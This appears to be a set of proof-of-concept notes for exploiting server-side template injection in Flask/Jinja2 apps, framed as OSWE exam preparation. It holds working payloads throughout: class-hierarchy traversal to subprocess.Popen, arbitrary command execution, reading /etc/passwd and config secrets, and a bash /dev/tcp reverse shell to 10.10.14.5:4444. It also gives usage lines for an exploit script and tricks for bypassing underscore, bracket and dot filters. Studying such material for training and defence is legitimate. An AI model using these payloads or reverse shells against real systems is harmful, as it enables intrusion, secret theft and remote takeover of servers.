# SSTI Jinja2 RCE PoC Notes

## Vulnerability Summary
- **Target**: Flask/Jinja2 applications with user input in templates
- **Type**: Server-Side Template Injection → RCE
- **Impact**: Remote code execution, sensitive data exposure

## Key Concepts
Template engines evaluate expressions. If user input is directly embedded in templates without proper sanitization, attackers can inject template directives to execute arbitrary Python code.

## Attack Flow
```
1. Identify Template Context
   → Look for {{user_input}} in templates
   → Search for render_template_string() usage

2. Confirm SSTI
   → Test: {{7*7}} → should return 49
   → Test: {{config}} → leaks Flask config

3. Build Payload Chain
   → Access __class__.__mro__ to reach object
   → Navigate to subprocess.Popen
   → Execute arbitrary commands

4. Achieve RCE
   → Read /etc/passwd
   → Execute reverse shell
   → Access application secrets
```

## Quick Usage
```bash
# Test for SSTI
python3 poc_ssti_jinja2.py --target-ip 192.168.1.10 --target-port 5000

# Read Flask configuration
python3 poc_ssti_jinja2.py --target-ip 192.168.1.10 --target-port 5000 --command read_config

# Execute reverse shell
python3 poc_ssti_jinja2.py --target-ip 192.168.1.10 --target-port 5000 \
  --listening-ip 10.10.14.5 --listening-port 4444 --command revshell

# Custom command execution
python3 poc_ssti_jinja2.py --target-ip 192.168.1.10 --target-port 5000 \
  --command exec --exec-cmd "cat /etc/passwd"

# With Burp proxy
python3 poc_ssti_jinja2.py --target-ip 192.168.1.10 --target-port 5000 \
  --proxy http://127.0.0.1:8080 --verbose
```

## Jinja2 Payloads

### Basic Detection
```
{{7*7}}
{{7*'7'}}  # Returns '7777777' (confirms Jinja2)
```

### Information Disclosure
```
{{config}}
{{self.__dict__}}
{{request.application.__globals__}}
```

### Object Navigation (Python 3)
```python
# Access object class
{{().__class__}}

# Access Method Resolution Order
{{().__class__.__mro__}}

# Access object base
{{().__class__.__mro__[1]}}

# Access all subclasses
{{().__class__.__mro__[1].__subclasses__()}}
```

### RCE via subprocess.Popen
```python
# Find Popen index (varies by Python version, typically around 414)
{{().__class__.__mro__[1].__subclasses__()[414]}}

# Execute command
{{().__class__.__mro__[1].__subclasses__()[414](
    ['cat', '/etc/passwd'], 
    stdout=-1
).communicate()[0].decode()}}
```

### Reverse Shell Payload
```python
{{().__class__.__mro__[1].__subclasses__()[414](
    ['bash', '-c', 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1']
).communicate()}}
```

## OSWE Exam Tips

### Detection
1. **Always test `{{7*7}}` first** - returns 49 confirms SSTI
2. **Differentiate template engines**:
   - `{{7*'7'}}` → '7777777' (Jinja2)
   - `{{7*'7'}}` → 49 (Twig, other engines)
3. **Check for WAF/filtering** - may need encoding

### Exploitation
1. **Find Popen index dynamically**:
   ```python
   {% for x in ().__class__.__mro__[1].__subclasses__() %}
   {% if 'Popen' in x.__name__ %}{{ loop.index }}{% endif %}
   {% endfor %}
   ```

2. **Alternative without Popen**:
   ```python
   # Via os.system
   {{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
   
   # Via eval
   {{request.application.__globals__.__builtins__.eval('__import__("os").popen("id").read()')}}
   ```

3. **Bypass filters**:
   - Use `\x5f` instead of `_`
   - Use `|attr()` method: `{{()|attr('\x5f\x5fclass\x5f\x5f')}}`
   - Use request objects: `{{request.args.cmd}}`

### Common Injection Points
- User profile pages with custom themes
- Email templates
- Error messages
- Dynamic page titles
- Search result highlighting
- Report generation

## Defense Bypasses

### Underscore Filtering
```python
# Use hexadecimal escape
{{()|attr('\x5f\x5fclass\x5f\x5f')}}

# Use request.args
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')}}
```

### Bracket Filtering
```python
# Use __getitem__
{{().__class__.__mro__.__getitem__(1)}}

# Use pop()
{{().__class__.__mro__.pop(1)}}
```

### Dot Filtering
```python
# Use |attr filter
{{()|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)}}
```

## References
- PortSwigger: https://portswigger.net/research/server-side-template-injection
- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
- HackTricks: https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
